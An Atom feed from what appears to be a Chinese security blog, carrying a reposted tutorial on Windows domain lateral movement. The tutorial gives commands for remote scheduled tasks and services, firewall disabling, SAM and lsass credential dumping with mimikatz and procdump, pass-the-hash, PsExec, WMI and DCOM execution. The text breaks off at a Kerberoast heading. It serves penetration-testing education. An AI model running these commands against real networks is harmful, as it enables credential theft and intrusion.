<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>这里有一个网站</title>
  
  <subtitle>一个不怎么安全的网站</subtitle>
  <link href="https://blog.njcit.me/atom.xml" rel="self"/>
  
  <link href="https://blog.njcit.me/"/>
  <updated>2023-08-08T00:56:10.075Z</updated>
  <id>https://blog.njcit.me/</id>
  
  <author>
    <name>ccadmin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>域内横向移动基础【转载】</title>
    <link href="https://blog.njcit.me/2023/08/08/%E5%86%85%E7%BD%91/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%9F%BA%E7%A1%80/"/>
    <id>https://blog.njcit.me/2023/08/08/%E5%86%85%E7%BD%91/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%9F%BA%E7%A1%80/</id>
    <published>2023-08-08T03:05:52.000Z</published>
    <updated>2023-08-08T00:56:10.075Z</updated>
    
    <content type="html"><![CDATA[<p>转载自：https://www.cnblogs.com/R0ser1/p/16154463.html</p><h1 id="利用windwos远程连接">利用Windwos远程连接</h1><h2 id="ipc">IPC</h2><p>IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。<strong>建立IPC连接</strong> 有域的话一定得带上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\1.1.1.3\ipc$ /user:w2k3\administrator <span class="hljs-string">&quot;1&quot;</span><br></code></pre></td></tr></table></figure><p>输入net use即可看到建立的连接 <strong>常用的命令</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">//映射磁盘到本地</span><br>net <span class="hljs-keyword">use</span> e: \\<span class="hljs-number">1.1</span>.<span class="hljs-number">1.3</span>\c$<br><span class="hljs-comment">//删除映射的磁盘</span><br>net <span class="hljs-keyword">use</span> e: /del<br><br><span class="hljs-comment">//列出主机的文件</span><br>dir \\<span class="hljs-number">1.1</span>.<span class="hljs-number">1.3</span>\c$<br><br><span class="hljs-comment">//tasklist查看对方的进程</span><br>tasklist /s <span class="hljs-number">1.1</span>.<span class="hljs-number">1.3</span> /u w2k3\administrator /p <span class="hljs-number">1</span><br><br><span class="hljs-comment">//断开连接</span><br>net <span class="hljs-keyword">use</span> \\<span class="hljs-number">1.1</span>.<span class="hljs-number">1.3</span>\ipc$ /del<br></code></pre></td></tr></table></figure><h1 id="利用windwos计划任务">利用Windwos计划任务</h1><p>Windows 可用于创建计划任务的命令有两个，分别是 at 和 schtasks，at 在Windows Server 2008 及之后的系统中，已经被废弃了</p><ul><li>1、查看目标主机时间</li><li>2、上传可执行文件到目标主机</li><li>3、设置计划任务执行可执行文件</li><li>4、删除计划任务</li></ul><p>查看主机时间</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> \\<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>将 bat 程序上传到目标主机</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">copy</span> evil.bat \\<span class="hljs-number">1.1</span>.<span class="hljs-number">1.3</span>\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><h2 id="利用-at-命令">利用 at 命令</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-built_in">at</span> \\<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span> <span class="hljs-number">20</span>:<span class="hljs-number">19</span>:<span class="hljs-number">10</span> c:\calc.<span class="hljs-keyword">bat</span><br></code></pre></td></tr></table></figure><p>清除id为1的任务</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">at</span> \\<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span> <span class="hljs-number">1</span> /<span class="hljs-built_in">del</span><br></code></pre></td></tr></table></figure><p>我们还可以例如直接powershell加载一个马反弹shell。像上面那种操作是不会回显的，我们可以将at计划任务直接执行系统命令然后写入文本。</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">at</span> \\<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">17</span>:<span class="hljs-number">05</span>:<span class="hljs-number">00</span> <span class="hljs-built_in">cmd</span>.exe /c &quot;<span class="hljs-built_in">ipconfig</span> &gt; C:\result.txt&quot;<br></code></pre></td></tr></table></figure><p>然后使用type命令远程读取该文件</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">type</span> \\1.1.1.1\c$\result.txt</span><br></code></pre></td></tr></table></figure><h2 id="利用-schtasks-命令">利用 schtasks 命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 开机以 system 权限执行 C:\calc.bat</span><br>schtasks /create /s 1.1.1.1 /tn calc /sc onstart /tr C:\calc.bat /ru system /f<br></code></pre></td></tr></table></figure><p>这样子执行的话可能会报错，因为某些策略的问题。 <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1648042814509-3dcd9a3e-2573-47ee-921b-1746c5e9db0a.png"><imgsrc="域内横向移动基础/1648042814509-3dcd9a3e-2573-47ee-921b-1746c5e9db0a.png"alt="image.png" /></a> 我们需要加上用户名密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /s 1.1.1.2 /u administrator /p xxx /tn calc /sc onstart /tr C:\calc.bat /ru system /f<br></code></pre></td></tr></table></figure><p>这样子就没问题。如果需要它马上运行我们可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /run /s 1.1.1.2 /u administrator /p xxx /i /tn <span class="hljs-string">&quot;calc&quot;</span><br></code></pre></td></tr></table></figure><p>执行如下命令强制删除该计划任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /delete /s 1.1.1.2 /tn <span class="hljs-string">&quot;calc&quot;</span> /f<br></code></pre></td></tr></table></figure><p>想回显执行命令和上面操作一样，写个文件就行。</p><h1 id="利用windwos服务">利用Windwos服务</h1><h2 id="sc">SC</h2><p>使用条件：</p><ul><li>当前跳板机用户具有管理员权限(因为要创建服务)。</li><li>与目标机器已经建立ipc连接</li></ul><p>做好上面步骤我们创建一个sc服务</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> create <span class="hljs-keyword">shell </span><span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;c:\shell.exe&quot;</span><br></code></pre></td></tr></table></figure><p>注意这里的格式，“=”后面是必须空一格的，否则会出现错误。立即启动服务</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> start <span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><p>使用完后删除刚才创建的服务</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> delete <span class="hljs-keyword">shell </span> <span class="hljs-comment">#删除服务</span><br></code></pre></td></tr></table></figure><p>我们还可以通过设置服务来关闭防火墙：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> create unablefirewall <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> start unablefirewall<br></code></pre></td></tr></table></figure><h1 id="hash的抓取与传递攻击">Hash的抓取与传递攻击</h1><h2 id="lm-hash-和-ntlm-hash">LM Hash 和 NTLM Hash</h2><p>Windwos操作系统通常采用两种方法对用户的明文密码进行加密处理。域环境中的话，用户信息存储在ntds.dit，加密后为散列值。操作系统密码一部分为LM Hash，另一部分为NTLMHash。在Windwos操作系统中，Hash结构通常为<code>username:RID:LM-HASH:NT-HASH</code> LM HASH的加密流程如下：</p><ul><li>1、密码长度限制为14个字符</li><li>2、密码全部转换为大写</li><li>3、密码转换为16进制字符串，不足14字节用0补全</li><li>4、密码的16进制字符串被分成两个7byte部分</li><li>5、再分7bit为一组,每组末尾加0，再组成一组</li><li>6、上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。</li><li>7、将加密后的两组拼接在一起，得到最终LM HASH值。</li></ul><p>为了解决LM HASH强度不够的问题，微软推出了NTLM HASH：</p><ul><li>1、先将用户密码转换为十六进制格式。</li><li>2、将十六进制格式的密码进行Unicode编码。</li><li>3、使用MD4对Unicode编码数据进行Hash计算</li></ul><p>因为在vista后不再支持LM HASH，因此抓到的hash中的LMHASH都是aad3b435b51404eeaad3b435b51404ee在hash传递攻击时，可以替换成0：00000000000000000000000000000000</p><h2 id="hash抓取">Hash抓取</h2><p>在windows上，C:。我们可以使用相关手段获取该hash。</p><h3id="使用reg命令获取本地用户凭据hash">使用reg命令获取本地用户凭据hash：<ahref="https://www.cnblogs.com/R0ser1/p/16154463.html#使用reg命令获取本地用户凭据hash">#</a></h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs verilog"><span class="hljs-keyword">reg</span> save  hklm\sam sam<span class="hljs-variable">.hive</span><br><span class="hljs-keyword">reg</span>  save hklm\system system<span class="hljs-variable">.hive</span><br><span class="hljs-keyword">reg</span>  save hklm\security security<span class="hljs-variable">.hive</span><br></code></pre></td></tr></table></figure><p>然后利用mimikatz读取文件，把上述文件放在和mimikatz同目录下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::sam /sam:sam.hive /system:system.hive /security security.hive<br></code></pre></td></tr></table></figure><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1648469375476-a158c89c-2aa9-4351-8f40-30bddc5e0b46.png"><imgsrc="域内横向移动基础/1648469375476-a158c89c-2aa9-4351-8f40-30bddc5e0b46.png"alt="image.png" /></a></p><h3 id="pwdump7">PwDump7</h3><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1648469788142-73781820-0b81-4f02-a76e-830cdc73ffef.png"><imgsrc="域内横向移动基础/1648469788142-73781820-0b81-4f02-a76e-830cdc73ffef.png"alt="image.png" /></a></p><h3 id="mimikatz">mimikatz</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug<br>token::elevate<br>lsadump::sam<br></code></pre></td></tr></table></figure><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1648475628080-271c9c03-ce12-4f86-816f-78dcb604bcba.png"><imgsrc="域内横向移动基础/1648475628080-271c9c03-ce12-4f86-816f-78dcb604bcba.png"alt="image.png" /></a> 从lsass.exe中获取散列值和明文密码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug<br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p>但是这个不一定可以抓到明文密码。主要还是kb2871997的问题。kb2871997补丁会删除除了wdigestssp以外其他ssp的明文凭据，但对于wdigestssp只能选择禁用。用户可以选择将HKEY_LOCAL_MACHINE0来禁用。但是kb2871997对于本地Administrator(rid为500，操作系统只认rid不认用户名)和本地管理员组的域用户是没有影响的。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">//开启<br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br>//关闭<br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure><p>powershell</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-comment">//开启</span><br><span class="hljs-keyword">Set</span>-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -<span class="hljs-keyword">Name</span> UseLogonCredential -<span class="hljs-keyword">Type</span> DWORD -Value <span class="hljs-number">1</span><br><span class="hljs-comment">//关闭</span><br><span class="hljs-keyword">Set</span>-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -<span class="hljs-keyword">Name</span> UseLogonCredential -<span class="hljs-keyword">Type</span> DWORD -Value <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>我们还可以导出lsass.dmp文件来使用mimikatz进行解密</p><ul><li>使用任务管理器</li><li>使用Procdump</li></ul><p>第一种找到程序然后导出到内存就可以。 第二种是微软官方出的工具。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">procdump64.exe  -accepteula -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp<br>mimikatz.exe  <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords  full&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>如果要破解的话可以使用Hashcat或者在线的站点。</p><h2 id="hash传递攻击">Hash传递攻击</h2><h3 id="使用mimikatz进行pth">使用Mimikatz进行PTH</h3><p>当我们抓取到域管理员的NTLMHash时我们可以用mimikatz获取的Administrator的Hash添加进lsass中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">privilege::debug<br>sekurlsa::pth /user:administrator /domain:hacker /ntlm:b07ca2629fec66cca1e412ef7e7a6cd9<br></code></pre></td></tr></table></figure><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1648539353641-668fe933-36cd-471d-9022-11cbf9a9d093.png"><imgsrc="域内横向移动基础/1648539353641-668fe933-36cd-471d-9022-11cbf9a9d093.png"alt="image.png" /></a>然后回弹出一个新的窗口，这时访问远程主机或服务，就不用提供明文密码了，如下，我们列出了域控制器DC的c盘目录（要使用主机名，不能用IP，否则报错）：<ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1648539438625-e84e5abd-79e3-4c2e-8acc-d9d1f63014d7.png"><imgsrc="域内横向移动基础/1648539438625-e84e5abd-79e3-4c2e-8acc-d9d1f63014d7.png"alt="image.png" /></a>之后，攻击者便可以利用Windows7跳板机任意访问内网其他机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息。</p><h3 id="msf进行pth">MSF进行PTH</h3><p>在msf中常用的模块有</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">auxiliary/admin/smb/psexec_command      // 在目标机器上执行系统命令<br>exploit/windows/smb/psexec            // 用psexec执行系统命令<br>exploit/windows/smb/psexec_psh         // 使用powershell作为payload<br></code></pre></td></tr></table></figure><p>以第二个为例攻击内网的其他机器 <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1648539735424-599fd206-bfdf-4054-9f72-c35c8a51dc1e.png"><imgsrc="域内横向移动基础/1648539735424-599fd206-bfdf-4054-9f72-c35c8a51dc1e.png"alt="image.png" /></a>成功进行横向移动，这里注意这里的smbpass选项，其可以为明文密码，也可以为Hash，但Hash必须是完整的，如果不知道前面的LMHash部分，可以像上面那样用0代替 <ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1648539816853-03f5cdc7-2611-4a81-b1d3-e7428ae2ea7a.png"><imgsrc="域内横向移动基础/1648539816853-03f5cdc7-2611-4a81-b1d3-e7428ae2ea7a.png"alt="image.png" /></a></p><h1 id="利用psexec">利用PsExec</h1><h2 id="利用psexec.exe">利用Psexec.exe</h2><p>下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexecpsexec 是 windows下非常好的一款远程命令行工具。psexec的使用不需要对方主机开方3389端口，只需要对方开启admin$共享(该共享默认开启)。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。由于PsExec是Windows提供的工具，所以杀毒软件将其列在白名单中。PsExec的基本原理：</p><ul><li><ol type="1"><li>通过ipc$连接，释放二进制文件psexecsvc.exe到目标</li></ol></li><li><ol type="1"><li>通过服务管理SCManager远程创建一个psexec服务，并启动服务</li></ol></li><li><ol type="1"><li>客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据</li></ol></li><li><ol type="1"><li>运行结束后删除服务</li></ol></li></ul><p>PsExec前提条件：</p><ul><li>对方主机开启了 admin$共享，如果关闭了admin$共享，会提示：找不到网络名</li><li>对方未开启防火墙</li><li>如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</li><li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。</li></ul><p>操作命令如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">PsExec<span class="hljs-selector-class">.exe</span> -accepteula \\<span class="hljs-number">1.1</span>.<span class="hljs-number">1.3</span> -u hacker\administrator -<span class="hljs-selector-tag">p</span> xxxx -s cmd<span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure><ul><li>-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框</li><li>-u：用户名</li><li>-p：密码</li><li>-s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell</li></ul><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1648815406312-9d35e690-9998-4706-8f3f-96f6b6b4a1b1.png"><imgsrc="域内横向移动基础/1648815406312-9d35e690-9998-4706-8f3f-96f6b6b4a1b1.png"alt="image.png" /></a></p><h2 id="利用msf的psexec模块">利用MSF的Psexec模块</h2><p>常用模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/smb/psexec           // 用psexec执行系统命令,与psexec.exe相同<br>exploit/windows/smb/psexec_psh       // 使用powershell作为payload(PsExec的PowerShell版本)<br>auxiliary/admin/smb/psexec_command   // 在目标机器上执行系统命令<br>exploit/windows/smb/ms17_010_psexec<br></code></pre></td></tr></table></figure><blockquote><p>使用exploit/windows/smb/psexec_psh，该模块生成的payload主要是有powershell实现的。powershell作为Windows自带的脚本运行环境，免杀效果比由exploit/windows/smb/psexec生成的exe版payload好。但是，因为Windows7、Windows Server2008及以上版本的操作系统才默认有powershell，所以如果遇到默认不含powershell的WindowsXP或Windows Server2003，就要使用由exploit/windows/smb/psexec生成的exe版本的payload。</p></blockquote><p><strong>注意：在使用psexec执行远程命令时，会在目标系统中创建一个psexec服务。命令执行后，psexec服务将会被自动删除。由于创建或删除服务时会产生大量的日志，所以会在攻击溯源时通过日志反推攻击流程。</strong></p><h1 id="利用wmi">利用WMI</h1><p>WMI是由一系列工具集组成的，可以通过/node选项使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令</p><blockquote><p>通过渗透测试发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。因为在这个过程中不会产生日志，所以，对网络管理员来说增加了攻击溯源的成本。而对攻击者来说，其恶意行为被发现的可能性有所降低、隐蔽性有所提高。由此，越来越多的APT开始使用WMI进行攻击，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。</p></blockquote><p>注意：使用WMIC连接远程主机，需要目标主机开放135和445端口。(135 端⼝是WMIC 默认的管理端⼝，而 wimcexec 使⽤445端⼝传回显)</p><h2 id="远程桌面">远程桌面</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">wmic <span class="hljs-operator">/</span>node:<span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.3</span> <span class="hljs-operator">/</span><span class="hljs-keyword">USER</span>:hacker\user2 PATH win32_terminalservicesetting <span class="hljs-keyword">WHERE</span> (__Class<span class="hljs-operator">!=</span>&quot;&quot;) <span class="hljs-keyword">CALL</span> SetAllowTSConnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="查询进程信息">查询进程信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:1.1.1.3 /user:hacker\user2 /password:xxxx process list brief<br></code></pre></td></tr></table></figure><h2 id="远程创建进程">远程创建进程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:1.1.1.3 /user:hacker\administrator /password:xxx process call create <span class="hljs-string">&quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;</span><br></code></pre></td></tr></table></figure><p>使用WMIC远程执行命令，在远程系统中启动WMIC服务(目标服务器需要开放其默认135端口，WMIC会以管理员权限在远程系统中执行命令)。如果目标服务器开启了防火墙，WMIC将无法连接。另外由于wmic命令没有回显，需要使用IPC$和type命令来读取信息。需要注意的是，如果WMIC执行的是恶意程序，也不会留下日志。下面我们介绍一下几个可以用来执行wmi远程命令的工具。</p><h1 id="利用wmiexec">利用WMIEXEC</h1><p>wmiexec是对windows自带的wmic做了一些强化，让渗透变得更容易。比较好用的在这里介绍几种。wmiexec需要提供账号密码进行远程连接，但是如果没有破解出账号和明文密码，也可以配合哈希传递或票据注入功能一起使用，先进行传递或注入，然后再使用WMIEXEC即可。</p><h2 id="impacket中的wmiexec.py">Impacket中的wmiexec.py</h2><p>该脚本是impacket工具包中的一个工具，主要在从Linux像Windows进行横向渗透时使用，十分强大，可以走socks代理进入内网。下载地址：https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">python wmiexec.py administrator:密码@<span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br><span class="hljs-comment">// python wmiexec.py 用户名:密码@目标IP</span><br></code></pre></td></tr></table></figure><p>如果对wmiexec.py指定-hashes选项的话，则可进行哈希传递。当然还有exe版本的。同理命令</p><h1 id="利用dcom">利用DCOM</h1><p>DCOM（分布式组件对象模型）是微软基于组件对象模型（COM）的一些列概念和程序接口，COM提供了一套允许在同一台计算机上的客户端和服务器之间通信的接口。通过DCOM，客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求下面通过一个实验来讲解如何使用DCOM在远程主机上面执行命令。在使用该方法的条件如下：</p><ul><li>需要关闭目标系统的防火墙，如果目标主机DC没有关闭防火想的话会报错</li><li>在远程主机上执行命令时，必须使用具有本地管理员权限的账号。</li></ul><h2id="调用mmc20.application远程执行命令">调用MMC20.Application远程执行命令</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$com</span> = [activator]<span class="hljs-symbol">:</span><span class="hljs-symbol">:CreateInstance</span>([type]<span class="hljs-symbol">:</span><span class="hljs-symbol">:GetTypeFromProgID</span>(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>))<br><br><span class="hljs-variable">$com</span>.<span class="hljs-title class_">Document</span>.<span class="hljs-title class_">ActiveView</span>.<span class="hljs-title class_">ExecuteShellCommand</span>(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c calc&quot;</span>,<span class="hljs-string">&quot;Minimized&quot;</span>)<br></code></pre></td></tr></table></figure><p>如果你开始链接了IPC那么你输入ipc的IP，直接远程拿shell执行他都没问题呢<ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1648887539614-e3502cc5-7dae-444a-8526-e61ef2bdc1ab.png"><imgsrc="域内横向移动基础/1648887539614-e3502cc5-7dae-444a-8526-e61ef2bdc1ab.png"alt="image.png" /></a></p><h2id="调用9ba05972-f6a8-11cf-a442-00a0c90a8f39">调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</h2><p>同理，看你连IPC没，这里记录本地。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$com</span> = [<span class="hljs-title class_">Type</span>]<span class="hljs-symbol">:</span><span class="hljs-symbol">:GetTypeFromCLSID</span>(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>)<br><span class="hljs-variable">$obj</span> = [<span class="hljs-title class_">System</span>.<span class="hljs-title class_">Activator</span>]<span class="hljs-symbol">:</span><span class="hljs-symbol">:CreateInstance</span>(<span class="hljs-variable">$com</span>)<br><span class="hljs-variable">$item</span> = <span class="hljs-variable">$obj</span>.item()<br><span class="hljs-variable">$item</span>.<span class="hljs-title class_">Document</span>.<span class="hljs-title class_">Application</span>.<span class="hljs-title class_">ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c calc&quot;</span>,<span class="hljs-string">&quot;c:\windows\system32&quot;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><ahref="https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/png/22305987/1648888071876-5da20d19-507e-4bf9-bcf0-5fc68950c027.png"><imgsrc="域内横向移动基础/1648888071876-5da20d19-507e-4bf9-bcf0-5fc68950c027.png"alt="image.png" /></a></p><h1id="spn及其kerberoast攻击">SPN及其<strong>kerberoast攻击</strong></h1><p>spn是服务主体的名称，是服务实例(如:HTTPS,MYSQL)的唯一标识。</p><h2 